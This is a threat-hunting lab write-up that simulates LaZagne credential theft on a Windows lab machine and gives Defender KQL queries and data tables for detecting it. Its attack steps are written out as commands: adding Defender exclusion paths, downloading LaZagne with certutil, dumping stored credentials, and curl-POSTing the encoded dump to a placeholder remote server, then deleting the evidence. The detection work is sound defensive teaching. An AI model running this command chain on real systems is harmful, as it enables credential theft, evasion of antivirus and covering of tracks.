# Threat Event (Unauthorized Use of Lagzane for Encrypted Communications and Data Exfiltration)

**Detection of Lagzane Execution for Secure File Transfers**

## Steps the "Bad Actor" took Create Logs and IoCs:
1.  Created a Folder Exception in the Downloads Directory to Evade Detection

```PowerShell
Add-MpPreference -ExclusionPath "C:\Users\labuser\Downloads"
```

```PowerShell
Add-MpPreference -ExclusionPath "C:\Users\Public"
```

2. Downloaded LagZane from an External Source: https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe

```PowerShell
certutil.exe -f -urlcache https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe C:\Users\Public\lazagne.exe
```
3. Open a PowerShell console and Executed LaZagne to Extract Stored Credentials:

```PowerShell
C:\Users\labuser\Downloadslazagne.exe all > C:\Users\Public\creds_dump.txt
```

4. Exfiltrated Stolen Credentials to a Remote Server:

```PowerShell
certutil -encode C:\Users\Public\creds_dump.txt encoded.txt && curl -X POST -H "Content-Type: text/plain" --data-binary "@encoded.txt" https://<REMOTE Server>
```

5. Deleted Evidence to Cover Tracks

```PowerShell
Remove-Item " C:\Users\labuser\Downloads\LaZagne.exe" -Force
Remove-Item "C:\Users\Public\creds_dump.txt" -Force
Remove-Item "C:\Users\Public\encoded.txt" -Force
```

---

## Tables Used to Detect IoCs:
| **Parameter** | **Description**                                                                  |
| ------------- | -------------------------------------------------------------------------------- |
| **Name**      | DeviceFileEvents                                                                 |
| **Info**      | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table |
| **Purpose**   | Detects **LaZagne** download, execution  of credential files.                    |

| **Parameter** | **Description**                                                                              |
| ------------- | -------------------------------------------------------------------------------------------- |
| **Name**      | DeviceProcessEvents                                                                          |
| **Info**      | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table             |
| **Purpose**   | Detects execution of LaZagne, certutil.exe encoding, and curl.exe exfiltration attempts.<br> |

| **Parameter** | **Description**                                                                                                             |
| ------------- | --------------------------------------------------------------------------------------------------------------------------- |
| **Name**      | DeviceNetworkEvents                                                                                                         |
| **Info**      | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table                                   |
| **Purpose**   | Detects external connections used for credential exfiltration via curl.exe to an attacker-controlled server (webhook.site). |


| **Parameter** | **Description**                                                                                                  |
| ------------- | ---------------------------------------------------------------------------------------------------------------- |
| **Name**      | DeviceEvents                                                                                                     |
| **Info**      | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceevents-table                               |
| **Purpose**   | Detects file deletion (Remove-Item), AV exclusions (Add-MpPreference), and PowerShell commands used for stealth. |


---

## Related Queries:

```kql

// Detects LaZagne executable file being downloaded
DeviceFileEvents 
| where FileName has "lazagne.exe"

// Detects attempts to exclude directories from Windows Defender scans
DeviceEvents
| where AdditionalFields contains "ExclusionPath"

// Detects execution of LaZagne
DeviceProcessEvents 
| where ProcessCommandLine contains "lazagne.exe" 
| project Timestamp, DeviceName, AccountName, ActionType, FileName, FolderPath, SHA256, ProcessCommandLine

// Detects execution of certutil.exe or curl.exe for data exfiltration
DeviceProcessEvents 
| where ProcessCommandLine has_any ("certutil","certutil.exe", "curl.exe")

// Detects network exfiltration activity using curl.exe or certutil.exe
DeviceNetworkEvents
| where InitiatingProcessFileName in ("curl.exe", "certutil.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl

// Detects evidence deletion (PowerShell Remove-Item commands)
DeviceEvents
| where ActionType == "PowerShellCommand"
| project Timestamp, InitiatingProcessAccountName, DeviceName, AdditionalFields

```

---

## Created By:
- **Author Name:** Alejandro Perez Hernandez
- **Author Contact:** [LinkedIn](https://www.linkedin.com/in/alejandro-perez-hernandez/)
- **Date:** February 21, 2025

---

## Additional Notes:

- Consider implementing endpoint monitoring policies to detect credential dumping tools.
- Block suspicious PowerShell and certutil.exe executions using Group Policy or Defender ATP.

---

## Revision History:
| **Version** | **Changes**   | **Date**            | **Modified By**             |
| ----------- | ------------- | ------------------- | --------------------------- |
| 1.0         | Initial draft | `February 19, 2025` | `Alejandro Perez Hernandez` |





